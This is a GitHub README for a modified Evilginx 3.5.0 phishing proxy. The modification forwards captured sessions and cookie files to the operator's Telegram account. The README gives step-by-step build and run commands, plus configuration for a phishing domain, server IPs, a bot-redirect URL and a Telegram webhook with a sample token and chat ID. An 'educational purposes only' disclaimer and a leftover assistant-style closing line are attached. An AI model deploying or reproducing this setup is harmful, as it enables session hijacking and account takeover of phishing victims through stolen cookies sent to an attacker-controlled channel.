
![eviltelgram](https://github.com/itwizardo/evilginx2telegram/assets/32465924/66b6a8f4-73ff-496e-a2c7-38f5a8ff1c3f)

```markdown
# Evilginx 3.5.0 - Modified By Itwizardo

This is a modified version of Evilginx 3.5.0 that includes functionality to send
sessions to your Telegram account, including the cookies file,
it also has the new Gophish intergration and bug fixes.
```
## Ubuntu Installation

To install Evilginx 3.5.0 - Modified By Itwizardo on Ubuntu, follow these steps:

1. Clone the repository:

```bash
git clone https://github.com/itwizardo/evilginx2telegram.git
```

2. Navigate to the cloned directory:

```bash
cd evilginx2telegram
```

3. Install dependencies:

```bash
go get
```

4. Build the project:

```bash
go build
```

5. Make the executable:

```bash
make
```

6. Navigate to the build directory:

```bash
cd build
```

7. Set permissions for the Evilginx executable:

```bash
chmod +rwx evilginx
```

8. Run Evilginx:

```bash
./evilginx -p ../phishlets/
```

## Configuration Setup

Before using Evilginx, you need to set up your configuration. Follow these steps:

1. Set the domain:

```
config domain something.com
```

2. Set the external server IP:

```
config ipv4 external serverip
```

3. Set the server IP to bind to:

```
config ipv4 bind serverip
```

4. Set the unauthenticated URL:

```
config unauth_url https://bots.here.redirected.com/
```

5. Set autocert to on or off:

```
config autocert on/off
```

6. Set up the Telegram webhook:

```
config webhook_telegram 7192062302:AAGvU9P57FF37gz-ZRUuonESXwvStiQV58O/15604540690
```

Replace `7192062302:AAGvU9P57FF37gz-ZRUuonESXwvStiQV58O` with your Telegram token.

Replace `15604540690` with your Chat id.

## Telegram Guide

Here's a guide on how to set up Telegram for Evilginx:

### How to Get Chat ID

1. Go to Telegram and search for `@raw_data_bot`.
2. Start a conversation with the bot.
3. The bot should provide you with your chat ID.

### How to Get Token

1. Go to Telegram and search for `@BotFather`.
2. Start a conversation with the bot by sending `/start`.
3. Follow the instructions to create a new bot and get your Telegram token.

**For Educational Purposes Only:**

Evilginx 3.5.0 - Modified By Itwizardo is intended for educational purposes only. Any use of this tool for malicious or illegal activities is strictly prohibited. The developers and contributors are not responsible for any misuse of this tool.

```

Feel free to modify this README as needed for your repository! Let me know if you need further assistance.
```
